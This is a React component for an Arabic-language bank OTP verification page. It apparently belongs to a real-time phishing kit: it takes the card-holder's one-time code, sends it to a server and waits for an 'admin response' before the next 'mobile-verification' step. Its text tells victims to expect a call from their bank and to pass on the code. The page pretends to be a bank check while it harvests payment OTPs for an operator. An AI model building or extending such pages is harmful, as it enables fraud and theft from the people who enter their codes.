import Main from "@/components/MainWrapper";
import { Link, useLocation } from "react-router-dom";
import { useEffect, useState } from "react";
import { mainInfo } from "@/real-time/context/signals";
import { maskPhoneNumber } from "@/lib/helpers";
import InputWithClearIcon from "@/components/InputWithClearIcon";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";

const Otp = () => {
  useEffect(() => {
    setCurrentPage("otp");
  }, []);

  const [error, setError] = useState<any>({});
  const { state } = useLocation();

  const goNext = (e: any) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(e.target));

    // [ ] should be true for production
    sendDataToServer({
      data,
      current: "otp",
      nextPage: "mobile-verification",
      waitingForAdminResponse: true,
    });
  };

  return (
    <Main>
      <section className="bg-gray-100 h-screen pt-20">
        <div className="bg-white container mx-auto px-4 py-6 rounded-xl max-w-lg">
          <div className="bg-gradient-to-tl from-main/20 to-main/5 py-2 px-6 w-full mb-4 rounded-xl">
            <img
              src="/assets/images/logo.webp"
              alt="logo"
              className="h-10 mx-auto"
            />
          </div>

          <div className="bg-main/20 rounded-2xl py-3 ps-4 pe-20 relative">
            <img
              src="/assets/images/client/OTP.png"
              className="w-14 absolute left-2 top-4 lg:top-2"
              alt="otp logo"
            />

            <h2 className="text-xl font-bold text-main">
              التحقق من خلال رسالة نصية لتأكيد العملية أدخل رمز التحقق المرسل
              إلى جوالك
            </h2>
            <p className="text-gray-600">
              سيتم الاتصال بك من قبل البنك المصدر للبطاقة الائتمانية , يرجى
              اتباع الرد الالي لإرسال رمز التحقق برسالة نصية
            </p>
            {mainInfo?.value?.phone && (
              <p className="text-gray-600 mt-2" style={{ direction: "ltr" }}>
                <span className="text-main">
                  {maskPhoneNumber(mainInfo.value.phone)}
                </span>
              </p>
            )}
          </div>

          <form
            onSubmit={goNext}
            className="mt-5 w-full grid grid-cols-6 items-end gap-6"
          >
            <div className="col-span-6">
              <InputWithClearIcon
                setError={setError}
                label="رمز التحقق"
                id="otp"
                placeholder="أدخل رمز التحقق لمرة واحدة هنا"
                rtl={true}
                type="password"
                max={6}
              />

              {error?.otp && (
                <p className="mt-1 col-span-6 text-red-500 text-xs h-4">
                  {error.otp}
                </p>
              )}
            </div>

            <div className="col-span-6 flex flex-col lg:flex-row sm:items-center gap-4">
              <button
                className="w-full lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-main hover:brightness-110 text-white transition-colors disabled:cursor-not-allowed disabled:bg-gray-400"
                type="submit"
                disabled={error?.otp}
              >
                تأكيد
              </button>
              <Link
                className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-3 px-6 bg-gray-200 hover:bg-gray-100 text-gray-800 transition-colors"
                to={"/payment-gateway"}
                state={state}
              >
                السابق
              </Link>
            </div>
          </form>
        </div>
      </section>
    </Main>
  );
};
export default Otp;
